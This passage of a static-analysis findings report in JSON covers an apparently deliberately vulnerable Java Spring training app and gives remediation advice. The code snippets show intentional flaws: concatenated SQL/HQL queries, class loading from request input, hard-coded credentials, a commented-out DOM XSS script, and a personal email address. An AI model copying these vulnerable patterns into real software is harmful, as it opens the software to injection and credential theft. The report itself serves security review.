the case number, so the support team can debug the code without having direct access to any PII. \nStoring information in the logger must still contain information that is useful to the application production team for troubleshooting. \nIf required to log stack trace for debugging/troubleshooting, this log file has to be protected and it's access controlled (need to know basis).\n\nfor more information, see: https://www.loggly.com/blog/30-best-practices-logging-scale/ and \nhttps://michaelscodingspot.com/logging-in-dotnet/ \n\nNote:\n*Any message printed or stored will be detected as &quot;System Information Leak (Internal or External)&quot;. Messages need to be checked to make sure no system information is printed (e.g. replace the stack trace to the exception message, as it gives less system information to an attacker).\n**It is recommended to use a logger instead of Console.write. This will not remove the alerts from SAST tools. System information leak can be avoided to an extent by replacing StackTrace (.Net) or printstacktrace(JAVA) with logger. But even with logger, we need to be avoid logging sensitive information.\n*** SAST tools will always log this as an issue once it sees the StackTrace. SAST tools will always detect an issue if you are using any method coming from the exception object even if there is no sensitive information being included in the logged.", "impact": "*****From System Information Leak Internal*****:\nNo impact for the code performance.\n\nNeed to notify the monitoring / SIEM teams about any change on the logs fields / format. This may impact the correlation rules.\n\nOld logs that contain PII information must be properly secure. Depending to the access level, the application team must open an incident to the SOC to respond and investigate if data was leaked internally.\n\n*****From System Information Leak Externa*****l:\nIf it does not exist yet, a generic error page needs to be created and approved by marketing / UI designers.", "abstract": "Use of logger"}]}, "mitigations": {"mitigation": [{"system": "Web Server / IIS", "configuration": "Refer to System Information Leak Internal and System Information Leak External.", "backend": null, "frontend": null, "comments": "Refer to System Information Leak Internal and System Information Leak External."}, {"system": "Web Server / Tomcat", "configuration": "No logger entry", "backend": "<em class=\"bold\">log4j.properties //new property file added to enable log4j logger</em>\n# Root logger option\nlog4j.rootLogger = DEBUG, file\n\n# Redirect log messages to a log file\nlog4j.appender.file = org.apache.log4j.RollingFileAppender\n#outputs to Tomcat home\nlog4j.appender.file.File = ${catalina.home}/logs/mysecapp.log\nlog4j.appender.file.MaxFileSize = 5MB\nlog4j.appender.file.MaxBackupIndex = 10\nlog4j.appender.file.layout = org.apache.log4j.PatternLayout\nlog4j.appender.file.layout.ConversionPattern = %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n\t\n\n<em class=\"bold\">web.xml //if the file is specified in classpath, below configuration is not reqd</em>\n<em class=\"blue\">&lt;context-param&gt;\n        &lt;param-name&gt;log4jConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;/WEB-INF/log4j.properties&lt;/param-value&gt;\n   &lt;/context-param&gt;\n\n\t &lt;listener&gt;\n        &lt;listener-class&gt;org.springframework.web.util.Log4jConfigListener&lt;/listener-class&gt;\n    &lt;/listener&gt;</em>", "frontend": null, "comments": "Configure the proper log level in production.\n\nAdd protections to log files (e.g., access restriction). Prefer to send log information to a logging system (e.g., rsyslog)"}]}}}}, "Poor Error Handling: Overly Broad Throws": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00203", "function": "Function: downloadPropertyFile()", "line": "416", "snippet": "//Vul 99\n\t@RequestMapping(value=\"downloadPropFile.html\", method=RequestMethod.POST)\n\tpublic ModelAndView downloadPropertyFile(HttpServletRequest request, HttpServletResponse response) throws Exception {\n    \tModelAndView mv = new ModelAndView();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00204", "function": "Function: evaluate()", "line": "949", "snippet": "@RequestMapping(value=\"eval.html\", method= {RequestMethod.GET,RequestMethod.POST})\n\tpublic ModelAndView evaluate(HttpServletRequest request) throws Exception {\n\t\tString exp = request.getParameter(\"exp\");\n\t\t//Double val = Double.parseDouble(request.getParameter(\"exp\"));"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00205", "function": "Function: getStudentSubjectGrade()", "line": "94", "snippet": "}\n\t\n\tpublic List<StudentSubjectGradeBean> getStudentSubjectGrade(String dburl, String uName, String password)\n\t\t\tthrows NamingException, SQLException, Exception {"}]}, {"file": "src/com/accenture/sec/service/EmployeeService.java", "items": [{"id": "IN00206", "function": "Function: getDepartmentMap()", "line": "11", "snippet": "EmployeeBean addEmployee(EmployeeBean bean);\n\nMap<Integer, String> getDepartmentMap() throws Exception;\n\nList<EmployeeBean> employeeList(Object employeeSearchObj);"}]}, {"file": "src/com/accenture/sec/controller/StudentController.java", "items": [{"id": "IN00207", "function": "Function: listStudentGradeJSON()", "line": "107", "snippet": "@RequestMapping(value=\"listStudentGradeJSON.html\", method= RequestMethod.GET)\n\tpublic Iterable<StudentSubjectGradeBean> listStudentGradeJSON(HttpServletRequest request) throws SQLException, NamingException, Exception\n\t{\n\t\tlogger.debug(\"Enter StudentSubjectGradeList\");"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00208", "function": "Function: getDepartmentMapByName()", "line": "107", "snippet": "}\n\t\n\tpublic Map<Integer, String> getDepartmentMapByName(String depName) throws Exception{\n\t\t\n\t\tMap<Integer, String> departmentMap = new HashMap<Integer, String>();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00209", "function": "Function: createXML()", "line": "1036", "snippet": "@RequestMapping(value=\"creatxml.html\", method= {RequestMethod.GET,RequestMethod.POST})\n\tpublic ModelAndView createXML(HttpServletRequest request) throws Exception {\n\t\tModelAndView mv = new ModelAndView();"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAO.java", "items": [{"id": "IN00210", "function": "Function: getDepartmentMap()", "line": "11", "snippet": "EmployeeBean addEmployee(EmployeeBean bean);\n\n\tMap<Integer, String> getDepartmentMap() throws Exception;\n\n\tList<EmployeeBean> getEmployeeList(Object employeeSearchObj);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00211", "function": "Function: getDepartmentMap()", "line": "146", "snippet": "//Vul 16 -- Empty catch block\n\t@ModelAttribute(\"departmentList\")\n\t   public Map<Integer, String> getDepartmentMap() throws Exception {\n\t\tMap<Integer, String> departmentMap = new HashMap<Integer, String>();\n\t\ttry {"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00212", "function": "Function: listDetail()", "line": "1016", "snippet": "@RequestMapping(value=\"class.html\", method= {RequestMethod.GET,RequestMethod.POST})\n\tpublic ModelAndView listDetail(HttpServletRequest request) throws Exception {\n\t\tModelAndView mv = new ModelAndView();"}]}, {"file": "src/com/accenture/sec/controller/StudentController.java", "items": [{"id": "IN00213", "function": "Function: listStudentGradeCred()", "line": "139", "snippet": "@RequestMapping(value=\"listStudentGradeCred.html\", method= RequestMethod.POST)\n\tpublic ModelAndView listStudentGradeCred(HttpServletRequest request) throws SQLException, NamingException, Exception\n\t{\n\t\tString dburl = request.getParameter(\"dburl\");"}]}, {"file": "src/com/accenture/sec/controller/StudentController.java", "items": [{"id": "IN00214", "function": "Function: listStudentGrade()", "line": "54", "snippet": "@RequestMapping(value=\"listStudentGrade.html\", method= RequestMethod.POST)\n\tpublic ModelAndView listStudentGrade(HttpServletRequest request) throws SQLException, NamingException, Exception\n\t{\n\t\tlogger.debug(\"Enter StudentSubjectGradeList\");"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00215", "function": "Function: getStudentSubjectGradeList()", "line": "48", "snippet": "}\n\n\tpublic List<StudentSubjectGradeBean> getStudentSubjectGradeList(String userName,String datasource) throws NamingException, SQLException, Exception {\n\t\t\n\t\tConnection conn=null;"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00216", "function": "Function: downloadFile()", "line": "353", "snippet": "@RequestMapping(value=\"download.html\", method=RequestMethod.GET)\n\tpublic ModelAndView downloadFile( @RequestParam(value=\"file\")String name,HttpSession session,HttpServletResponse response) throws Exception {\n    \tModelAndView mv = new ModelAndView();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00217", "function": "Function: remediatedFile()", "line": "874", "snippet": "}\t\n\t\n\tprivate boolean remediatedFile(String filePath) throws Exception {\n\t\tString originalFilePath = filePath;\n\t\tFile file = Paths.get(filePath, new String[0]).toFile();"}]}], "remediation": null}, "Session Puzzling: Spring": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00218", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "226", "snippet": "return new ModelAndView(\"success\", \"loginBean\", bean);\n\t\t} else {\n\t\t\tmv.setViewName(\"login\");"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00219", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "206", "snippet": "mv.setViewName(\"success\");\n\t\t\tmv.addObject(\"msg\", \"Welcome \" + bean.getUserName());\n\t\t\tmv.addObject(\"userObj\", bean);\n\t\t\tsess.setAttribute(\"loginBean\", bean); // Made available across controllers"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00220", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "328", "snippet": "user.setUserName(userProfile.getUserName());\n\t\t\t\n\t\t\treturn new ModelAndView(\"addUserProfile\",\"userProfile\",user);\n\n\t\t} else {"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00221", "function": "Variable: userAccountBean", "line": "244", "snippet": "@RequestMapping(value=\"storeUser.html\", method= RequestMethod.POST)\n\tpublic ModelAndView addUser(@ModelAttribute(\"userAccountBean\") UserAccountBean userAccountBean,HttpServletRequest request,HttpServletResponse response) throws SQLException\n\t{\n\t\tOptional<UserAccountBean> optUserAcc = Optional.ofNullable(userAccountBean);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00222", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "328", "snippet": "user.setUserName(userProfile.getUserName());\n\t\t\t\n\t\t\treturn new ModelAndView(\"addUserProfile\",\"userProfile\",user);\n\n\t\t} else {"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00223", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "226", "snippet": "return new ModelAndView(\"success\", \"loginBean\", bean);\n\t\t} else {\n\t\t\tmv.setViewName(\"login\");"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00224", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "292", "snippet": "mv= new ModelAndView(\"addUser\",\"userAccountBean\",user);\n\n\t\t} else {"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00225", "function": "Variable: userProfile", "line": "336", "snippet": "@RequestMapping(value=\"addUserDataFromJson.html\", method= {RequestMethod.GET,RequestMethod.POST})\n\tpublic ModelAndView saveUserData(@ModelAttribute(\"userProfile\") UserProfileForm userProfile) {\n\t\t\n\t\tif(userProfile.getUserName()!=null) {"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00226", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "205", "snippet": "{\n\t\t\tmv.setViewName(\"success\");\n\t\t\tmv.addObject(\"msg\", \"Welcome \" + bean.getUserName());\n\t\t\tmv.addObject(\"userObj\", bean);\n\t\t\tsess.setAttribute(\"loginBean\", bean); // Made available across controllers"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00227", "function": "Variable: bean", "line": "159", "snippet": "@RequestMapping(value=\"validate.html\", method=RequestMethod.POST)\n\tpublic ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response) throws IOException\n\t{\n\t\tlogger.info(\"Inside login validation info\");"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00228", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "206", "snippet": "mv.setViewName(\"success\");\n\t\t\tmv.addObject(\"msg\", \"Welcome \" + bean.getUserName());\n\t\t\tmv.addObject(\"userObj\", bean);\n\t\t\tsess.setAttribute(\"loginBean\", bean); // Made available across controllers"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00229", "function": "Variable: userProfile", "line": "310", "snippet": "//vul 107\n\t@RequestMapping(value=\"addUserProfile.html\", method= {RequestMethod.GET,RequestMethod.POST})\n\tpublic ModelAndView addUserProfile(@ModelAttribute(\"userProfile\") UserProfileForm userProfile)\n\t{\n\t\tString isValid = \"true\";"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00230", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "205", "snippet": "{\n\t\t\tmv.setViewName(\"success\");\n\t\t\tmv.addObject(\"msg\", \"Welcome \" + bean.getUserName());\n\t\t\tmv.addObject(\"userObj\", bean);\n\t\t\tsess.setAttribute(\"loginBean\", bean); // Made available across controllers"}]}], "remediation": null}, "Access Control: SecurityManager Bypass": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00254", "function": "FunctionCall: getDeclaredField()", "line": "281", "snippet": "Person per = new Person();\n\t\t\tField field = Person.class.getDeclaredField(\"height\");\n\t        field.setAccessible(true);\n\t        field.set(per, \"162cm\");"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00255", "function": "FunctionCall: getConnection()", "line": "69", "snippet": "String dbpwd = prop.getProperty(\"sec_password\");\n\t\t\t\n\t\t\tconn = DriverManager.getConnection(dbURL,dbuser, dbpwd);\n\t\t      \n\t\t     Statement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00256", "function": "FunctionCall: getConnection()", "line": "323", "snippet": "String dbpwd = prop.getProperty(\"sec_password\");\n\t\t\t\n\t\t\tconn = DriverManager.getConnection(dbURL,dbuser, dbpwd);\n\t\t\t\n\t\t\tStatement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00257", "function": "FunctionCall: getConnection()", "line": "100", "snippet": "List<StudentSubjectGradeBean> studGradeList = new ArrayList<StudentSubjectGradeBean>();\n\n\t\tconn = DriverManager.getConnection(dburl, uName, password);\n\n\t\tStatement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00258", "function": "FunctionCall: forName()", "line": "1021", "snippet": "try {\n\t\tString ctl = request.getParameter(\"className\");\n\t    Class cmdClass = Class.forName(\"com.accenture.sec.dao.\"+ctl);\n\t    EmployeeDAO emp = (EmployeeDAO) cmdClass.newInstance();\n\t\tMap<Integer, String> departmentMap = emp.getDepartmentMap();"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00259", "function": "FunctionCall: get()", "line": "285", "snippet": "field.set(per, \"162cm\");\n\t        \n\t        String height = (String) field.get(per);\n\t        System.out.println(\"Height\"+height);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00260", "function": "FunctionCall: set()", "line": "283", "snippet": "Field field = Person.class.getDeclaredField(\"height\");\n\t        field.setAccessible(true);\n\t        field.set(per, \"162cm\");\n\t        \n\t        String height = (String) field.get(per);"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00261", "function": "FunctionCall: getConnection()", "line": "217", "snippet": "conn = DriverManager.getConnection(\"jdbc:sqlserver://localhost:1433;databaseName=VulnAppDB\",\"gurupriya\" , password.toString());\n\t\t\tStatement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00262", "function": "FunctionCall: newInstance()", "line": "1022", "snippet": "String ctl = request.getParameter(\"className\");\n\t    Class cmdClass = Class.forName(\"com.accenture.sec.dao.\"+ctl);\n\t    EmployeeDAO emp = (EmployeeDAO) cmdClass.newInstance();\n\t\tMap<Integer, String> departmentMap = emp.getDepartmentMap();"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00263", "function": "FunctionCall: getConnection()", "line": "136", "snippet": "String dbpwd = prop.getProperty(\"sec_password\");\n\t\t\t\t\n\t\t\t\tconn = DriverManager.getConnection(dbURL,dbuser, dbpwd);\n\t\t\t\t\n\t\t\t\t//Statement stmt = conn.createStatement();"}]}], "remediation": null}, "Password Management: Password in Comment": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00274", "function": "Comment()", "line": "125", "snippet": "remediationparamList.put(\"2\",password);\n\t\t\t\n\t\t\t//String sql = \"select * from Account where userName='\"+uName+\"' and Password='\"+password+\"'\";\n\t\t\tString insertSql = \"Insert into Account set userName='\"+uName+\"' and Password='\"+password+\"'\";"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00275", "function": "Comment()", "line": "154", "snippet": "// Approach 2\n\t\t\n\t/*\n\t * CriteriaBuilder cb = em.getCriteriaBuilder();\n\t * CriteriaQuery<UserAccountEntity> cr ="}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00276", "function": "Comment()", "line": "277", "snippet": "/*\n\t\t * final String[] passwdArray = { null }; GuardedString gs =\n\t\t * userAccountBean.getPwd(); gs.access(new GuardedString.Accessor() {"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00277", "function": "Comment()", "line": "191", "snippet": "// authentication process\n\n\t\t// clear the password from the memory\n\t\tfor (int i = 0; i < chars.length; i++)\n\t\t\tchars[i] = '\\0';"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00278", "function": "Comment()", "line": "229", "snippet": "userAccount.setUserName(rs.getString(\"Username\"));\n\t\t\t\t\t//GuardedString gs = new GuardedString(rs.getString(\"Password\").toCharArray());\n\t\t\t\t\tuserAccount.setPwd(rs.getString(\"Password\"));\n\t\t\t\t\tuserAccount.setRoleID(rs.getString(\"RoleID\"));"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00279", "function": "Comment()", "line": "379", "snippet": "}\n\t\n\t/**\n\t * \"AES/CBC/PKCS5PADDING\" mode to be used to avoid insecure mode of operation\n\t * initialize the ciphers with the given key"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00280", "function": "Comment()", "line": "166", "snippet": "String uname = request.getParameter(\"uname\");\n\t\tString password = request.getParameter(\"pwd\");\n\t\t//logger.debug(\"Inside login validation debug\"+Encode.forHtmlAttribute(uname)+\"without encoding\"+uname+Encode.forHtmlAttribute(password));\n\t\tlogger.debug(\"Inside login validation debug \"+ uname +\" without encoding\" + uname + password);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00281", "function": "Comment()", "line": "1109", "snippet": "if(user!=null && pass!=null) {\n\t\t\t\t//String filter = \"(&(uid=\" + user + \")(userPassword=\" + pass + \"))\";\n\t\t\t\t//String filter = \"(&(uid={0}))\";\n\t\t\t\tString filter = \"(&(uid=\" + user + \"))\";"}]}], "remediation": {"remediation": {"@id": "R.0015", "@name": "Password Management: Password in Comment", "@dateLastModified": "6/5/2020", "faqs": {"faq": {"question": "why this makes any difference, as there is no comment on the deployed code?", "answer": "The code is usually shared amongst many different developers, administrators, and sometimes even people providing support for the application. It is a good practice to store the password in a safe vault system, where access to the password follows a workflow (check out, check in, access log, auto change password, etc.)"}}, "recommendations": {"recommendation": {"@type": ".NET/C#/ASP", "vulncode": "public ActionResult Departments()\n        {<em class=\"red\">\n            //Database username: sa\n            //Database password: Mysapassword01</em>\n            using (SqlConnection con = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString))\n            {\n                con.Open();\n                using (SqlCommand command = new SqlCommand(&quot;Select Id, Name From dbo.Department&quot;,con))\n                {\n                    SqlDataReader reader = command.ExecuteReader();\n                    List&lt;Department&gt; listDepartments = new List&lt;Department&gt;();\n                    while (reader.Read())\n                    {\n                        Department department = new Department();\n                        department.Id = Convert.ToInt32(reader[&quot;Id&quot;]);\n                        department.Name = reader[&quot;Name&quot;].ToString();\n                        listDepartments.Add(department);\n                    }\n                    return View(listDepartments);\n                }\n            }\n        }", "nonvulncode": "public ActionResult Departments()\n        {\n            using (SqlConnection con = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString))\n            {\n                con.Open();\n                using (SqlCommand command = new SqlCommand(&quot;Select Id, Name From dbo.Department&quot;,con))\n                {\n                    SqlDataReader reader = command.ExecuteReader();\n                    List&lt;Department&gt; listDepartments = new List&lt;Department&gt;();\n                    while (reader.Read())\n                    {\n                        Department department = new Department();\n                        department.Id = Convert.ToInt32(reader[&quot;Id&quot;]);\n                        department.Name = reader[&quot;Name&quot;].ToString();\n                        listDepartments.Add(department);\n                    }\n                    return View(listDepartments);\n                }\n            }\n        }", "comments": "Remove any comment providing confidential information (e.g. credentials) from the code.\n\nSystem passwords must be stored and managed by a secure vault.\n\nA privilege access management system can implement workflows and strategies to provide the password and to log the access history. This is not to be replaced by an individual password manager such as KeePass, Kaspersky Password Manager, 1Password, etc.\n\nUse an approved on-demand privilege access manager such as: CyberArk OPM; Oracle PAM; MS Azure Vault;  AWS KMS; etc.", "impact": "Needs to remove the password from the comments, and re-compile the code. \nAs there is no control or information about who/how many people had access to the password in the past, it is recommended to change the passwords in use for a new one, and store it properly.", "abstract": "Commented sensitive information removed"}}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "SQL Injection: Persistence": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00282", "function": "createQuery()", "line": "82", "snippet": "TypedQuery query = (TypedQuery) em.createQuery(hql);\n\t  //query.setParameter(\"name\", uName); \n\t  List<Object[]> results = query.getResultList();"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00283", "function": "createQuery()", "line": "213", "snippet": "}\n\t\t  \t\t \n\t\tTypedQuery<EmployeeEntity> query = em.createQuery(cr);\n\t\tList<EmployeeEntity> results = query.getResultList();"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00284", "function": "createQuery()", "line": "163", "snippet": "TypedQuery query2 = (TypedQuery) em.createQuery(hql2);\n\t\t\n\t\tTypedQuery query = (TypedQuery) em.createQuery(hql);\n\t\t/*if(isCondCheck) {\n\t\t\tquery.setParameter(\"name\", \"%\" +employeeSearch.getEmpName() +\"%\");"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00285", "function": "createQuery()", "line": "52", "snippet": "public static <T> List<T> executeQuery(Class<T> type,CriteriaQuery<T> cr,EntityManager em){\n\t\tlogger.debug(\"Inside EmployeeDAOImp class\");\n\t\tTypedQuery<T> query = em.createQuery(cr);\n\t\tList<T> results = query.getResultList();"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00286", "function": "createQuery()", "line": "118", "snippet": "TypedQuery query = (TypedQuery) em.createQuery(hql);\n\t\tTypedQuery query2 = (TypedQuery) em.createQuery(hql2);\n\t\t\t\n\t\tList<Object[]> res  =  query.getResultList();"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00287", "function": "createQuery()", "line": "117", "snippet": "String hql2 =\"SELECT id,name from DepartmentEntity where Name like '%\" + depName  + \"%'\";\n\t\t\t\n\t\tTypedQuery query = (TypedQuery) em.createQuery(hql);\n\t\tTypedQuery query2 = (TypedQuery) em.createQuery(hql2);"}]}, {"file": "src/com/accenture/sec/dao/CommonDAO.java", "items": [{"id": "IN00288", "function": "createQuery()", "line": "20", "snippet": "logger.debug(\"Inside CommonDAO class\");\n\t\t\n\t\tTypedQuery<T> query = em.createQuery(cr);\n\t\tList<T> results = query.getResultList();"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00289", "function": "createQuery()", "line": "161", "snippet": "}\n\n\t\tTypedQuery query2 = (TypedQuery) em.createQuery(hql2);\n\t\t\n\t\tTypedQuery query = (TypedQuery) em.createQuery(hql);"}]}], "remediation": null}, "Password Management": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00304", "function": "setProperty()", "line": "439", "snippet": "//logger2.log(Level.parse(\"com.domain.application.debugLevel\"), \"Test logger\");\n\t\t\t//logger2.log(Level.parse(request.getParameter(\"loglevel\")), \"Test logger\");\n\t\t\tprop.setProperty(\"sec_password_encrypted\", encryptedText);\n\t\t\t\n\t\t\tFile file = new File(fileName);"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00305", "function": "java.sql.DriverManager.getConnection()", "line": "217", "snippet": "conn = DriverManager.getConnection(\"jdbc:sqlserver://localhost:1433;databaseName=VulnAppDB\",\"gurupriya\" , password.toString());\n\t\t\tStatement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00306", "function": "org.springframework.mail.javamail.JavaMailSenderImpl.setPassword()", "line": "259", "snippet": "mailSender.setUsername(\"gurupriyat@gmail.com\");\n\t\t\t    mailSender.setPassword(storedPassword);\n\t\t\t    \n\t\t\t    Properties props = mailSender.getJavaMailProperties();"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00307", "function": "java.sql.DriverManager.getConnection()", "line": "69", "snippet": "String dbpwd = prop.getProperty(\"sec_password\");\n\t\t\t\n\t\t\tconn = DriverManager.getConnection(dbURL,dbuser, dbpwd);\n\t\t      \n\t\t     Statement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00308", "function": "java.sql.DriverManager.getConnection()", "line": "100", "snippet": "List<StudentSubjectGradeBean> studGradeList = new ArrayList<StudentSubjectGradeBean>();\n\n\t\tconn = DriverManager.getConnection(dburl, uName, password);\n\n\t\tStatement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00309", "function": "java.sql.DriverManager.getConnection()", "line": "323", "snippet": "String dbpwd = prop.getProperty(\"sec_password\");\n\t\t\t\n\t\t\tconn = DriverManager.getConnection(dbURL,dbuser, dbpwd);\n\t\t\t\n\t\t\tStatement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00310", "function": "java.sql.DriverManager.getConnection()", "line": "136", "snippet": "String dbpwd = prop.getProperty(\"sec_password\");\n\t\t\t\t\n\t\t\t\tconn = DriverManager.getConnection(dbURL,dbuser, dbpwd);\n\t\t\t\t\n\t\t\t\t//Statement stmt = conn.createStatement();"}]}], "remediation": null}, "J2EE Bad Practices: Threads": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00311", "function": "start()", "line": "771", "snippet": "Thread thread = new Thread(runnable);\n\t      thread.start();\n\n\t      Thread.sleep(500);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00312", "function": "run()", "line": "770", "snippet": "};\n\n\t      Thread thread = new Thread(runnable);\n\t      thread.start();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00313", "function": "sleep()", "line": "773", "snippet": "thread.start();\n\n\t      Thread.sleep(500);\n\t      thread.interrupt();"}]}, {"file": "src/com/accenture/sec/controller/StudentController.java", "items": [{"id": "IN00314", "function": "sleep()", "line": "99", "snippet": "}\n\t\t\tif(grade<=100) {\n\t\t\t\tThread.sleep(100);\n\t\t\t\tgrade= grade+50;\n\t\t\t}"}]}, {"file": "src/com/accenture/sec/controller/StudentController.java", "items": [{"id": "IN00315", "function": "sleep()", "line": "94", "snippet": "grade=studDtl.getGrade();\n\t\t\t\tif(grade<=100) {\n\t\t\t\t\tThread.sleep(100);\n\t\t\t\t\tgrade = grade+20;\n\t\t\t\t}"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00316", "function": "interrupt()", "line": "774", "snippet": "Thread.sleep(500);\n\t      thread.interrupt();"}]}], "remediation": null}, "System Information Leak: HTML Comment in JSP": {"language": "JAVA", "files": [{"file": "WebContent/WEB-INF/jspViews/success.jsp", "items": [{"id": "IN00317", "function": "Comment()", "line": "67", "snippet": "<br>\n<!--<script>\nvar source = \"Hello \" + decodeURIComponent(location.hash.split(\"#\")[1]);  //Source\ndocument.write(\"<b>Current URL</b> : \" + source);"}]}, {"file": "WebContent/WEB-INF/jspViews/uploadFile.jsp", "items": [{"id": "IN00318", "function": "Comment()", "line": "68", "snippet": "</form>\n\n<!--center>creatxml.html\n        <h2><a href=\"download.html\">Click here to download file</a></h2>\n </center-->"}]}, {"file": "WebContent/WEB-INF/jspViews/commandExec.jsp", "items": [{"id": "IN00319", "function": "Comment()", "line": "34", "snippet": "<br>\n<h2 align=\"center\">Execute command</h2>\n  <!--select name=\"cmd\">\n    <option value=\"dir\">dir</option>\n    <option value=\"cd\">cd</option>"}]}, {"file": "WebContent/WEB-INF/jspViews/listEmployee.jsp", "items": [{"id": "IN00320", "function": "Comment()", "line": "14", "snippet": "<body>\n<div class=\"row\" width=\"100px\" float=\"right\"><a href=\"loadIndex.html?color=white\">Back</a></div>\n <!-- <div class=\"column\" float=\"right\" width=\"100px\"> <a 